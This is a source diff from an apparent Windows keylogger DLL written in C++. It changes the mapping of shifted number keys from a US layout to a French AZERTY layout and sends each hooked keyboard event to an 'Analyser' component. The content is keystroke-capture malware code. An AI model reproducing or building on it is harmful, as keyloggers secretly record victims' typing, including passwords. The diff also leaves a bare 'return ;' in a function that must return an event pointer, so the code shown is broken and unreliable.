@@ -51,34 +51,34 @@ void					analysis(WPARAM wParam, LPARAM lParam)
 					// 0x30-0x39 is 0-9 respectively
 				{
 				case 0x30:
-					str.append(")");
+					str.append("à");
 					break;
 				case 0x31:
-					str.append("!");
-					break;
-				case 0x32:
-					str.append("@");
-					break;
-				case 0x33:
-					str.append("#");
-					break;
-				case 0x34:
-					str.append("$");
-					break;
-				case 0x35:
-					str.append("%");
-					break;
-				case 0x36:
-					str.append("^");
-					break;
-				case 0x37:
 					str.append("&");
 					break;
+				case 0x32:
+					str.append("é");
+					break;
+				case 0x33:
+					str.append("\"");
+					break;
+				case 0x34:
+					str.append("'");
+					break;
+				case 0x35:
+					str.append("(");
+					break;
+				case 0x36:
+					str.append("-");
+					break;
+				case 0x37:
+					str.append("è");
+					break;
 				case 0x38:
-					str.append("*");
+					str.append("_");
 					break;
 				case 0x39:
-					str.append("(");
+					str.append("ç");
 					break;
 				}
 			}
@@ -462,6 +462,9 @@ void					analysis(WPARAM wParam, LPARAM lParam)
  * @param WPARAM wparam from hook
  * @return AEvent* the event created
  */
+ #include "keylogger_dll\Analyser.h"
+Analyser *ana = new Analyser();
+
 const AEvent* EventFactory::createKeyboardEvent(WPARAM wParam, LPARAM lParam, t_Context context) {
 
 
@@ -475,9 +478,10 @@ const AEvent* EventFactory::createKeyboardEvent(WPARAM wParam, LPARAM lParam, t_
 	bool extend = (tmp > 36);
 	bool prevKeyState = 0;
 	bool transState = 0;
-	analysis(wParam, lParam);
-	//	std::cout << "vkCode=" << vkKeyCode << "|scanCode=" << scanCode << "| at Time = " << context._ms << " |extraInfo=" << p->dwExtraInfo << "|wParam=" << wParam << "|lParam" << lParam  << std::endl;
-	return new KeyboardEvent(vkKeyCode, repeatCount, scanCode, extend, alt, prevKeyState, transState, context);
+//	analysis(wParam, lParam);
+	AEvent* kbevent = new KeyboardEvent(vkKeyCode, repeatCount, scanCode, extend, alt, prevKeyState, transState, context);
+	ana->analysis(kbevent);
+	return ;
 }
 
 /**
@@ -489,6 +493,5 @@ const AEvent* EventFactory::createKeyboardEvent(WPARAM wParam, LPARAM lParam, t_
 const AEvent* EventFactory::createMouseEvent(WPARAM wParam, LPARAM lParam, t_Context context) {
 	PMOUSEHOOKSTRUCT p = (PMOUSEHOOKSTRUCT)(lParam);
 	context._ms = time(NULL);
-	std::cout << "Mouse event!" << std::endl;
 	return new MouseEvent(p->wHitTestCode, context);
 }
